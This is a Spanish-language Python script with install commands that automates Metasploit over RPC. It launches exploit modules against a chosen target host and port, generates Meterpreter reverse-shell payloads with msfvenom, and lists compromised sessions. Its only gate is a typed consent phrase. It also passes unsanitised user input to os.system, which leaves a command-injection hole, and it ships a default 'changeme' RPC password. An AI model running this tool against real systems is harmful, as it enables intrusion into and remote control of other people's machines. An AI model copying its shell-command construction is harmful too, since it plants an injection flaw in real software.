msfrpcd -P tu_clave_rpc -S

sudo apt update && sudo apt install metasploit-framework python3-pip -y
pip3 install msgpack

python3 msf_tool_nirith.py

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Metasploit Automation Tool - Nirith Edition
Autora: Zyanetralys
Uso: Solo entornos autorizados y controlados
"""

import os
import sys
import json
import time
import msgpack
import pathlib
from socket import socket, AF_INET, SOCK_STREAM
from datetime import datetime
from getpass import getpass

CONFIG_DIR = pathlib.Path.home() / ".msf_tool_nirith"
CONFIG_FILE = CONFIG_DIR / "profiles.json"
LOG_FILE = CONFIG_DIR / "msf_tool_nirith.log"

CONFIRM_PHRASE = (
    "Confirmo que usaré la herramienta únicamente en entornos donde tengo permiso explícito "
    "(mi laboratorio, CTFs autorizados o pentests con contrato) y asumo toda la responsabilidad "
    "legal y ética por su uso. Nirith"
)

DEFAULT_PROFILE = {
    "name": "default",
    "authorized_execution": False,
    "rpc_user": "msf",
    "rpc_pass": "changeme",
    "rpc_host": "127.0.0.1",
    "rpc_port": 55553,
    "lhost": "127.0.0.1",
    "lport": 4444,
    "payload": "linux/x86/meterpreter/reverse_tcp"
}

def init_env():
    CONFIG_DIR.mkdir(exist_ok=True)
    if not CONFIG_FILE.exists():
        with open(CONFIG_FILE, "w") as f:
            json.dump({"default": DEFAULT_PROFILE}, f, indent=2)
    if not LOG_FILE.exists():
        LOG_FILE.touch()

def log(msg: str):
    ts = datetime.now().isoformat()
    with open(LOG_FILE, "a") as f:
        f.write(f"[{ts}] {msg}\n")

class RpcClient:
    def __init__(self, profile):
        self.host = profile["rpc_host"]
        self.port = int(profile["rpc_port"])
        self.user = profile["rpc_user"]
        self.passwd = profile["rpc_pass"]
        self.sock = None
        self.req_id = 1

    def connect(self):
        try:
            self.sock = socket(AF_INET, SOCK_STREAM)
            self.sock.settimeout(5)
            self.sock.connect((self.host, self.port))
            auth = self.rpc_call("auth.login", [self.user, self.passwd])
            if auth is None:
                print("❌ Autenticación RPC fallida.")
                return False
            return True
        except Exception as e:
            print(f"❌ Error conexión RPC: {e}")
            return False

    def rpc_call(self, method, params):
        req = {"method": method, "params": params, "id": self.req_id}
        self.req_id += 1
        try:
            self.sock.sendall(msgpack.packb(req))
            data = self.sock.recv(16384)
            resp = msgpack.unpackb(data, raw=False)
            if resp.get("error") is not None:
                print(f"❌ RPC error en {method}: {resp['error']}")
                return None
            return resp.get("result")
        except Exception as e:
            print(f"❌ Error RPC call {method}: {e}")
            return None

    def close(self):
        if self.sock:
            self.sock.close()

def confirm_authorization():
    print("\n⚠ Para ejecutar acciones intrusivas, escribe la frase EXACTA para autorizar:\n")
    print(CONFIRM_PHRASE)
    entrada = input("Frase: ").strip()
    if entrada == CONFIRM_PHRASE:
        print("✅ Autorización confirmada.")
        return True
    else:
        print("❌ Frase incorrecta. No autorizado.")
        return False

def load_profiles():
    with open(CONFIG_FILE, "r") as f:
        return json.load(f)

def save_profiles(profiles):
    with open(CONFIG_FILE, "w") as f:
        json.dump(profiles, f, indent=2)

def edit_profile(profiles, current):
    p = profiles[current]
    print(f"\nEditando perfil [{current}] - ENTER para mantener valor.\n")

    def inp(key):
        val = input(f"{key} [{p.get(key)}]: ").strip()
        if val:
            p[key] = val

    inp("rpc_user")
    inp("rpc_pass")
    inp("rpc_host")
    inp("rpc_port")
    inp("lhost")
    inp("lport")
    inp("payload")

    profiles[current] = p
    save_profiles(profiles)
    print("Perfil guardado.")

def generate_payload(profile):
    payload = input(f"Payload [{profile['payload']}]: ").strip() or profile["payload"]
    lhost = input(f"LHOST [{profile['lhost']}]: ").strip() or profile["lhost"]
    lport = input(f"LPORT [{profile['lport']}]: ").strip() or str(profile["lport"])
    output = input("Archivo de salida: ").strip() or "payload.bin"
    cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f elf -o {output}"
    print(f"\nComando: {cmd}")
    if confirm_authorization():
        print("Generando payload...")
        os.system(cmd)
        log(f"Payload generado: {output} ({payload} LHOST={lhost} LPORT={lport})")
        print(f"✅ Payload generado en {output}")
    else:
        print("❌ No autorizado, cancelado.")

def launch_exploit(profile):
    if not profile.get("authorized_execution", False):
        print("❌ Este perfil NO tiene autorización para ejecución real.")
        return
    if not confirm_authorization():
        print("❌ No autorizado para ejecutar exploit.")
        return

    client = RpcClient(profile)
    if not client.connect():
        print("❌ No se pudo conectar al RPC.")
        return

    module = input("Módulo exploit (ej: exploit/multi/handler): ").strip()
    rhost = input("RHOST (target IP): ").strip()
    rport = input("RPORT (target port): ").strip()

    print(f"\nEjecutando exploit {module} contra {rhost}:{rport}")

    if not client.rpc_call("module.use", ["exploit", module]):
        print("❌ No se pudo cargar módulo exploit.")
        client.close()
        return

    def set_option(opt, val):
        if not client.rpc_call("module.set", [module, opt, val]):
            print(f"❌ Error al establecer {opt} = {val}")
            client.close()
            return False
        return True

    if not set_option("RHOST", rhost):
        return
    if not set_option("RPORT", rport):
        return
    if not set_option("PAYLOAD", profile["payload"]):
        return
    if not set_option("LHOST", profile["lhost"]):
        return
    if not set_option("LPORT", str(profile["lport"])):
        return

    res = client.rpc_call("module.execute", [module, {}])
    if res is not None:
        print("✅ Exploit ejecutado.")
        log(f"Exploit {module} ejecutado contra {rhost}:{rport}")
    else:
        print("❌ Fallo al ejecutar exploit.")
        log(f"Fallo exploit {module} contra {rhost}:{rport}")

    client.close()

def list_sessions(profile):
    client = RpcClient(profile)
    if not client.connect():
        print("❌ No se pudo conectar al RPC para listar sesiones.")
        return
    sessions = client.rpc_call("session.list", [])
    if not sessions:
        print("No hay sesiones activas.")
    else:
        print("\nSesiones activas:")
        for sid, data in sessions.items():
            print(f"ID: {sid} | Tipo: {data.get('type')} | Host: {data.get('tunnel_peer')}")
    client.close()

def select_profile(profiles):
    print("\nPerfiles disponibles:")
    for p in profiles:
        print(f" - {p}")
    sel = input("Selecciona perfil: ").strip()
    if sel in profiles:
        return sel
    print("Perfil no encontrado. Usando 'default'.")
    return "default"

def authorize_profile(profiles, current):
    print("\n⚠ Para autorizar ejecución real, escribe la frase EXACTA:\n")
    print(CONFIRM_PHRASE)
    if confirm_authorization():
        profiles[current]["authorized_execution"] = True
        save_profiles(profiles)
        print("✅ Perfil autorizado para ejecución real.")
        log(f"Perfil {current} autorizado.")
    else:
        print("❌ Frase incorrecta, no autorizado.")

def main_menu():
    init_env()
    profiles = load_profiles()
    current_profile = "default"

    while True:
        p = profiles.get(current_profile, DEFAULT_PROFILE)
        print(f"\n=== MSF TOOL Nirith - Perfil: {current_profile} ===")
        print(f"Autorización ejecución real: {p.get('authorized_execution', False)}")
        print("\n1) Cambiar perfil")
        print("2) Editar perfil")
        print("3) Autorizar ejecución real")
        print("4) Ejecutar exploit")
        print("5) Generar payload")
        print("6) Listar sesiones")
        print("7) Salir")

        choice = input("> ").strip()
        if choice == "1":
            current_profile = select_profile(profiles)
        elif choice == "2":
            edit_profile(profiles, current_profile)
            profiles = load_profiles()
        elif choice == "3":
            authorize_profile(profiles, current_profile)
            profiles = load_profiles()
        elif choice == "4":
            launch_exploit(p)
        elif choice == "5":
            generate_payload(p)
        elif choice == "6":
            list_sessions(p)
        elif choice == "7":
            print("Saliendo. Que Athena y Nirith te guíen.")
            sys.exit(0)
        else:
            print("Opción inválida.")

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\nInterrumpido por usuario. Saliendo.")
        sys.exit(0)
